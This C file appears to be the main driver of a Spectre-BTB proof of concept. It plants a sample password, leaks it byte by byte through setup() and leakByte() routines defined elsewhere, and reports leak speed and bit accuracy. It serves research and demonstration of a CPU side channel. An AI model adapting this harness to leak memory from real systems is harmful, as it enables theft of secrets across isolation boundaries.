#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>

#include "config.h"
#include "spectre.h"
#include "timing.h"

char parity[] = {
    0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 4, 5, 5, 6, 5, 6, 6, 7, 5, 6, 6, 7, 6, 7, 7, 8
};

void benchmark(){
    struct timeval start_time;
    struct timeval end_time;

    int correct = 0;
    int amount = 10240;

    char secret[VALUES + 1];

    for(int i = 0; i < VALUES; i++){
        secret[i] = 0b01110001;
    }

    secret[VALUES] = 0;

    gettimeofday(&start_time, NULL);
    setup("##########", secret);
    gettimeofday(&end_time, NULL);

    int setup_time = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;

    int leak_start;

    leak_start = 0;

    gettimeofday(&start_time, NULL);
    for(int i = 0; i < amount / VALUES; i++){
        for(int j = 0; j < VALUES; j++){
            // printf("%x <-> %x\n", secret[j], leakByte(leak_start + j));
            correct += 8 - parity[secret[j] ^ leakByte(leak_start + j)];
        }
    }
    gettimeofday(&end_time, NULL);

    int leak_time = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;

    printf("leaked %d byte in %d ms. (%.2f bytes/s) correct: %d / %d bits (%.2f %%)\n", amount, leak_time, 1000.0 *(double)amount/(double)leak_time, correct, amount * 8, (double)correct * 12.5 / (double)amount);
    printf("setup took: %d ms.\n", setup_time);
}



int main(int argc, char** argv){
    timer_start();
    puts("[Spectre-BTB]");
#if BENCHMARK == 1
    char* public = "ABC";
    char* secret = "S3cret P4ssword, really!!";
    
    int secret_size = strlen(secret);
    int leak_start;

    leak_start = 0;

    char* leaked = malloc(secret_size);
    
    struct timeval start_time;
    struct timeval end_time;
    
    int millis;
    int correct = 0;

    
    puts(" ---- SETUP ---- ");
    fflush(stdout);
    
    setup(public, secret);
    
    puts("");
    
    puts(" ---- LEAKING ----");
    fflush(stdout);
    
    #define FACTOR 10000
    
    gettimeofday(&start_time, NULL);
    for(int j = 0; j < FACTOR; j++)
    for(int i = 0; i < secret_size; i++){
        leaked[i] = leakByte(leak_start + i);
        correct += 8- parity[leaked[i] ^ secret[i]];
    }
    gettimeofday(&end_time, NULL);
    
    millis = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;
    
    puts("");
    puts(" ---- RESULT ----");
    for(int i = 0; i < secret_size; i++){
        putchar(leaked[i]);
    }
    putchar('\n');
    printf("leaked %d bytes in %dms. (%.2f bytes / sec)\n", secret_size * FACTOR, millis, (double)secret_size * FACTOR / millis * 1000.0);
    printf("correct: %d / %d bits (%.2f%%)\n", correct, secret_size * FACTOR * 8, (double)correct / (secret_size * (FACTOR / 100 ) * 8));
    puts("");

#else

    char* public = "ABC";
    char* secret = "S3cret P4ssword, really!!";
    
    int secret_size = strlen(secret);
    int leak_start;

    leak_start = 0;

    char* leaked = malloc(secret_size);
    
    struct timeval start_time;
    struct timeval end_time;
    
    int millis;
    
    puts(" ---- SETUP ---- ");
    fflush(stdout);
    
    setup(public, secret);
    
    puts("");
    
    puts(" ---- LEAKING ----");
    fflush(stdout);
    
    gettimeofday(&start_time, NULL);
    for(int i = 0; i < secret_size; i++){
        leaked[i] = leakByte(leak_start + i);
    }
    gettimeofday(&end_time, NULL);
    
    millis = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;
    
    puts("");
    puts(" ---- RESULT ----");
    for(int i = 0; i < secret_size; i++){
        putchar(leaked[i]);
    }
    putchar('\n');
    printf("leaked %d bytes in %dms. (%.2f bytes / sec)", secret_size, millis, (double)secret_size / millis * 1000.0);
    puts("");
    
#endif /* BENCHMARK */
    timer_stop();

    return 0;
}

